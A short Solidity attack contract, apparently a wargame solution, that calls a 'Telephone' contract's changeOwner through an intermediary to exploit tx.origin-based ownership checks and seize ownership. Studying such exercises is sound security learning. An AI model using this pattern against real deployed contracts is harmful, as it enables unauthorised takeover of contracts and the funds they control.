// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol";
contract TelephoneAttack{
    Telephone addressContract;
    constructor(Telephone _addressContract)public {

        addressContract = Telephone(_addressContract);
    }

    function changeOwnerAttack(address  player ) public {
        addressContract.changeOwner(player);

    }

}